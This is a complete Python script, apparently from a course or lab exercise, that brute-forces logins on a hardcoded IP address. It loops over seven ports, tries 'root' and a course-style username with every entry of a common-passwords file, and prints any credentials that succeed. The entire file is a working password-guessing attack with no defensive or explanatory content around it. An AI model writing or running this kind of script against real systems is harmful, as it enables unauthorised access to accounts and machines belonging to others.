import socket

target_ip = "137.113.118.10"
target_ports = [1111, 2222, 3333, 4444, 5555, 6666, 7777]

usernames = ["root", "csci2971"]
passwords = open("common-passwords.txt", "r").readlines()


def brute_force_attack():
    for target_port in target_ports:
        for user in usernames:
            for password in passwords:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))

                s.send(f"{user}:{password}\n".encode())

                response = s.recv(1024).decode()

                if "Login successful" in response:
                    print(
                        f"Hacked successfully.\nLogin Credentials: {user}, {password}"
                    )
                    return
                else:
                    print("Hacking failed")

                s.close()


brute_force_attack()
